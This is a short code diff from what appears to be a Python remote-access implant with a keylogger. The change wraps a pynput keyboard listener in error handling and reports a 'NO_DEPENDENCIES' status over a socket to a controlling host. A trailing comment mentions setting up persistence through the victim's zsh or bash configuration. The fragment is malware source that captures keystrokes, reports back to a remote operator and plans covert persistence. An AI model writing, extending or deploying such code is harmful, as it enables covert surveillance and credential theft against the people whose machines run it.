@@ -43,13 +43,16 @@ def on_key_press(key):
 
 #Keylogging Functions
 def start_keylog():
-    with pynput.keyboard.Listener(on_press=on_key_press) as listener:
-        global keyLoggerAlive
-        if not keyLoggerAlive:
-            pynput.keyboard.Listener.stop()
-            listener.stop()
-        else:
-            listener.join()
+    try:
+        with pynput.keyboard.Listener(on_press=on_key_press) as listener:
+            global keyLoggerAlive
+            if not keyLoggerAlive:
+                pynput.keyboard.Listener.stop()
+                listener.stop()
+            else:
+                listener.join()
+    except:
+        s.send("NO_DEPENDENCIES".encode())
 
 #For persistence, see if the user uses zsh or bash. If they use neither, then don't do any persistence.
 try:
